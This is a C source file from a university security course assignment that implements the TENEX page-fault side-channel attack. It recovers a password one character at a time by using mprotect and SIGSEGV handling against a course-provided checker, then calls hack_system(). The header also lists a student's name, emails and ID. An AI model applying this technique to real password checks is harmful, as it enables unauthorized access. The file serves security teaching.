/*******************************************************
 CSE127 Project
 User routines file
 
   Name: 	Angela To	 
   Email: 	to.angelac@gmail.com / a4to@ucsd.edu
   Student ID:	A10657395

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Example password guesser using memory protection

 *******************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <setjmp.h>
#include <string.h>
#include "sysapp.h" // include our "system" header

char*      	buffer;
char*      	page_start;
int        	page_size;
sigjmp_buf 	jumpout;


/* HANDLE_SEGV
 * -A Handle page faults */
void handle_SEGV(int sig_num) {
	siglongjmp(jumpout, 1);
};


/*-- UNNECESSARY ------------------------------------------------------------*/
/* DEMONSTEATE_SIGNALS
 * -A This function is for example only, do not need to use for this project 
 * Demonstrates how referencing any memory in the protected page will 
 * produce a fault and how it *catches* the fault in your program */
int demonstrate_signals() {
  	char *buf = page_start;

	// this call arranges that _if_ there is a SEGV fault in the future 
        // (anywhere in the program) then control will transfer directly to this
        // point with sigsetjmp returning 1
	if (sigsetjmp(jumpout, 1) == 1) 
		return 1; // we had a SEGV

	signal(SIGSEGV, SIG_DFL);
	signal(SIGSEGV, &handle_SEGV);

	// We will now cause a fault to happen
        *buf = 0;
	return 0;
};  
/*-- UNNECESSARY ------------------------------------------------------------*/


/* MAIN
 * Try to crack password via TENEX mem tactic */
int main(int argc, char ** argv) {
	int 	BUFFLEN = 33;
	int 	i       = 0;
	int     j       = 0;
	char* 	ascii   = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}[]|:;'<>,.?/~`";
	char 	guess[BUFFLEN];

	// get the physical page size
	page_size = sysconf(_SC_PAGESIZE);

	// allocate the buffer - we need at least 3 pages 
        // (because malloc doesn't give us page aligned data)
	// Page:   1111111111111111222222222222222233333333333333334444444
	//         ^buffer        ^page_start                     ^ end of buffer
        // Prot:   ++++++++++++++++----------------+++++++++++++++++++++++

	//-A malloc returns 0 for failed allocation
	buffer = (char*)malloc(3 * page_size);		
	if (!buffer) {
		perror("malloc failed");
		exit(1);
	}

	// find the page start into buffer
	page_start = buffer + (page_size - ((unsigned long)buffer) % page_size);

	// fix the page start if there is not enough space 
	if ((page_start - buffer) <= 32) {
		page_start += page_size;
	}
	
	// prohibit access to the page
	if (mprotect(page_start, page_size, PROT_NONE) == -1) {
		perror("mprotect failed");
	}


	// It is not strictly necessary to understand the previous code and
        // there will be no need to modify it.
        //
        // Here is a summary of the situation: page_start points to an address
        // that is unmapped (i.e., if you access the memory at *page_start it 
        // will cause a SEGV fault).  Moreover, the 32 characters _before_ 
        // page_start _are_ guaranteed to be allocated.  

        // Finally, this calls a sample function to demonstrate how you should
        // use signals to capture and continue from a faulting access
        // to protected memory.  You can remove this code after you understand it.
        // You will need to use signals in this manner to solve the assignment.
/*
	if (demonstrate_signals(page_start) == 1) {
	  printf("We caught a page fault\n");
	}
*/

	// set guess to zeros
	bzero(guess, sizeof(guess));

	for (i = 0; i < BUFFLEN; i++) {
		for (j = 0; j < strlen(ascii); j++) {
			// Try the current character
			guess[i] = ascii[j];

			// Store the password such that the first character is
			// one byte before the page start (ie first character is
			// placed as the last byte of "unprotected" page)
			char* a_guess = page_start - i - 1;
			// Note, add to get size of guess
			strncpy(a_guess, guess, i + 1);	

			// Save point of return
			if (sigsetjmp(jumpout, 1) == 1) 
				break;

			// Set handlers for fault, if there is a fault, we have
			// guessed the correct character
			signal(SIGSEGV, SIG_DFL);
			signal(SIGSEGV, &handle_SEGV);

			// Do we have the right character ?
			if (check_pass(a_guess))
				break; 
		}
		// Do we have the right password ?
		printf("Guess: %s\n", guess);
		if (check_pass(guess)) {
	  		hack_system(guess);
		}
	}
	printf("Could not get the password!  Last guess was %s\n", guess);
	return 1;
}

